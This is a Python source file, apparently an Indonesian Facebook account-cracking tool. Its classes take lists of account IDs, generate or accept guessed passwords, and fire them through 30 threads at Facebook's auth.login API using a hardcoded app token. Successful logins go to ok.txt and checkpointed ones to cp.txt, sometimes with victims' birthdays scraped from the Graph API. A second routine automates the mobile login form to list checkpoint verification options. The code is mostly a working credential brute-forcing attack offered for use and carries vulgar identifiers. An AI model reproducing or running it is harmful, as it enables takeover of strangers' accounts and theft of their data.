        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m * --> %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
      if f in[""," "]:
        print((p+" ["+k+"•"+m+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print("\r\x1b[0;33m * --> %s • %s • %s   "%(username,password,ttl))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### Result Hasill ####

def results(kntl,zecheed):
        if len(kntl) !=0:
                print((p+" ["+k+"•"+m+"•"+p+"] OK: "+str(len(kntl))))
        if len(zecheed) !=0:
                print((p+" ["+k+"•"+m+"•"+p+"] CP: "+str(len(zecheed))))
        if len(kntl) ==0 and len(zecheed) ==0:
                print("\n")
                print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
   
def ress():
    os.system("clear")
    banner()
    print((p+" ["+k+"•"+m+"•"+p+"] Result Cracker"+p+" ["+k+"•"+m+"•"+p+"] "))
    print((p+"\n ["+k+"•"+m+"•"+p+"] Result OK "))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
    print((p+" ["+k+"•"+m+"•"+p+"] Result CP"))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
    input(p+" [BACK]")
    menu()


##### Check Option Checkpoint #####
### Result Hasill ####
def cek_opsi():
	print((p+"\n ["+k+"•"+m+"•"+p+"] Masukan File cp.txt"))
	files = input(p+" ["+k+"•"+m+"•"+p+"] File: ")
	if files == "":
		cek_opsi()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit(p+" ["+k+"•"+m+"•"+p+"] Files %s%s%s Tidak Ada!"%(h,files,p))
	print(p+" ["+k+"•"+m+"•"+p+"] Total Account Cp : "+str(len(buka_baju)))
	print(p+" ["+k+"•"+m+"•"+p+"] Check Opsi Checkpoint, Please Wait...")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split(" • ")
		print("\033[1;37m\n [\033[1;33m•\033[1;91m•\033[1;37m] "+kontol.replace(" + ",""))
		try:
			check_in(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	input("%s [BACK]"%(p))
	menu()

def check_in(user, pasw):
	mb = ("https://free.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(p+" ["+k+"•"+m+"•"+p+"] Total Opsi Yang Tersedia "+str(len(ngew)))
		for opt in range(len(ngew)):
			print("   "+str(opt+1)+" "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(p+" ["+k+"•"+m+"•"+p+"] %s"%(oh))
	else:
		print(p+" ["+k+"•"+m+"•"+p+"] Login Gagal, ID/Pass Salah\n")
if __name__=="__main__":
	os.system('git pull')
	menu()